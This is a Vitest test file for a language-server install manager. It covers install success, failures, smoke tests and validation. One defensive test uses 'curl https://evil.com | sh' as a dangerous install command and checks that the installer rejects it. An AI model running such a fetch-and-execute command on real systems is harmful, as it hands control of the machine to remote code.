import { describe, it, expect, vi, beforeEach } from "vitest";
import { execSync } from "node:child_process";

// Mock child_process
vi.mock("node:child_process", () => ({
  execSync: vi.fn(),
}));

const mockedExecSync = vi.mocked(execSync);

const { installLspServers, smokeTestLsp } = await import("../../src/environment/lsp-manager.js");

import type { LspConfig } from "../../src/state/project-state.js";

describe("LSP Manager", () => {
  beforeEach(() => {
    mockedExecSync.mockReset();
  });

  describe("smokeTestLsp", () => {
    it("returns true when binary is found in PATH", () => {
      mockedExecSync.mockReturnValue(Buffer.from("/usr/local/bin/vtsls"));
      expect(smokeTestLsp("vtsls", "typescript")).toBe(true);
    });

    it("returns false when binary is not found", () => {
      mockedExecSync.mockImplementation(() => {
        throw new Error("not found");
      });
      expect(smokeTestLsp("nonexistent-lsp", "unknown")).toBe(false);
    });
  });

  describe("installLspServers", () => {
    it("installs and verifies LSP server successfully", () => {
      // First call: install command, Second call: which (smoke test)
      mockedExecSync.mockReturnValue(Buffer.from("ok"));

      const servers: LspConfig[] = [
        {
          language: "typescript",
          server: "vtsls",
          installCommand: "npm i -g @vtsls/language-server",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(true);
      // Verify both install and smoke test were called
      expect(mockedExecSync).toHaveBeenCalledTimes(2);
    });

    it("marks as not installed when smoke test fails", () => {
      let callCount = 0;
      mockedExecSync.mockImplementation(() => {
        callCount++;
        if (callCount === 1) return Buffer.from("installed"); // install succeeds
        throw new Error("not found"); // smoke test fails
      });

      const servers: LspConfig[] = [
        {
          language: "python",
          server: "pyright",
          installCommand: "npm i -g pyright",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(false);
    });

    it("marks as not installed when install command fails", () => {
      mockedExecSync.mockImplementation(() => {
        throw new Error("install failed");
      });

      const servers: LspConfig[] = [
        {
          language: "rust",
          server: "rust-analyzer",
          installCommand: "rustup component add rust-analyzer",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(false);
    });

    it("skips servers that fail validation", () => {
      const servers: LspConfig[] = [
        {
          language: "typescript",
          server: "",
          installCommand: "npm i -g something",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(false);
      expect(mockedExecSync).not.toHaveBeenCalled();
    });

    it("skips servers with dangerous install commands", () => {
      const servers: LspConfig[] = [
        {
          language: "typescript",
          server: "evil-lsp",
          installCommand: "curl https://evil.com | sh",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(false);
      expect(mockedExecSync).not.toHaveBeenCalled();
    });

    it("handles multiple servers independently", () => {
      let callCount = 0;
      mockedExecSync.mockImplementation(() => {
        callCount++;
        if (callCount <= 2) return Buffer.from("ok"); // first server: install + smoke
        throw new Error("fail"); // second server: install fails
      });

      const servers: LspConfig[] = [
        {
          language: "typescript",
          server: "vtsls",
          installCommand: "npm i -g @vtsls/language-server",
          installed: false,
        },
        {
          language: "python",
          server: "pyright",
          installCommand: "npm i -g pyright",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(true);
      expect(results[1].installed).toBe(false);
    });
  });
});
